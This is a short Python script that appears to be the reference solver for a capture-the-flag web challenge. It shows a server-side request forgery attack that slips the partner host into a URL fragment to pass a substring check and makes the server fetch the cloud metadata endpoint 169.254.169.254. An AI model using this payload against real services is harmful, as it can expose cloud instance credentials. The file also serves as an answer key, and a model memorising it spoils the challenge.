#!/usr/bin/env python3
"""Reference solver for web-webhook-relay.

The callback validator only checks that the URL contains the partner host as a
substring. Put it in the fragment so the URL still points at the internal
metadata host.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.parse
import urllib.request


def solve(base):
    base = base.rstrip("/")
    evil = "http://169.254.169.254/latest/meta-data/flag#hooks.partner.example"
    url = base + "/webhook/deliver?url=" + urllib.parse.quote(evil, safe="")
    return json.loads(urllib.request.urlopen(url, timeout=10).read())["response"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
